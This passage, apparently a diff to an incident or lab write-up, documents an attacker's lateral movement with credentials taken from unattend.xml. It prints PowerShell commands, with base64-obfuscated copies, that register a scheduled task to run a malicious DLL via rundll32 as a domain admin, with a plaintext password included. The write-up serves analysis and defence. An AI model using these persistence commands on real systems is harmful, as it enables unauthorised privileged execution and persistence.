@@ -126,3 +126,22 @@ The attacker found exposed creds from unattend.xml. The attacker will most likel
 
 Lateral Movement
 ----------------
+The attacker used credentials recovered from the deployment artifact to register a scheduled task named “Chroom Updates” via PowerShell. The task was configured to run a malicious DLL using rundll32.exe under the DOMAIN\domain.admin account with highest privileges, establishing persistence and enabling privileged execution on the compromised system.
+```
+[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String("JABhAGMAdABpAG8AbgAgAD0AIABOAGUAdwAtAFMAYwBoAGUAZAB1AGwAZQBkAFQAYQBzAGsAQQBjAHQAaQBvAG4AIABgACAAIAAgAC0ARQB4AGUAYwB1AHQAZQAgACIAcgB1AG4AZABsAGwAMwAyAC4AZQB4AGUAIgAgAGAAIAAgACAALQBBAHIAZwB1AG0AZQBuAHQAIAAnACIAQwA6AFwAVQBzAGUAcgBzAFwAbQBpAGMAaABlAGwAdgBpAGMAXABBAHAAcABEAGEAdABhAFwAUgBvAGEAbQBpAG4AZwBcAHUAcABkAGwAYQB0AGUALgBkAGwAbAAiACwAUwB0AGEAcgB0AFcAJwA="))
+
+
+$action = New-ScheduledTaskAction `   -Execute "rundll32.exe" `   -Argument '"C:\Users\michelvic\AppData\Roaming\updlate.dll",StartW' # Define task action
+
+[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String("UgBlAGcAaQBzAHQAZQByAC0AUwBjAGgAZQBkAHUAbABlAGQAVABhAHMAawAgAGAAIAAgACAALQBUAGEAcwBrAE4AYQBtAGUAIAAiAEMAaAByAG8AbwBtACAAVQBwAGQAYQB0AGUAcwAiACAAYAAgACAAIAAtAEEAYwB0AGkAbwBuACAAJABhAGMAdABpAG8AbgAgAGAAIAAgACAALQBVAHMAZQByACAAIgBEAE8ATQBBAEkATgBcAGQAbwBtAGEAaQBuAC4AYQBkAG0AaQBuACIAIABgACAAIAAgAC0AUABhAHMAcwB3AG8AcgBkACAAIgBhAGQAdQBzAGUAcgBhAGQAQAAyADYAIgAgAGAAIAAgACAALQBSAHUAbgBMAGUAdgBlAGwAIABIAGkAZwBoAGUAcwB0ACAAYAAgACAAIAAtAEYAbwByAGMAZQA="))
+
+
+Register-ScheduledTask `   -TaskName "Chroom Updates" `   -Action $action `   -User "DOMAIN\domain.admin" `   -Password "aduserad@26" `   -RunLevel Highest `   -Force # Register scheduled task
+
+[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String("UwB0AGEAcgB0AC0AUwBjAGgAZQBkAHUAbABlAGQAVABhAHMAawAgAC0AVABhAHMAawBOAGEAbQBlACAAIgBDAGgAcgBvAG8AbQAgAFUAcABkAGEAdABlAHMAIgA=
+"))
+
+Start-ScheduledTask -TaskName "Chroom Updates" # Start the task
+```
+Now the attacker is running as domain.admin instead of michelvic. The DLL also runs with elevated privs and its persisting again. 
+
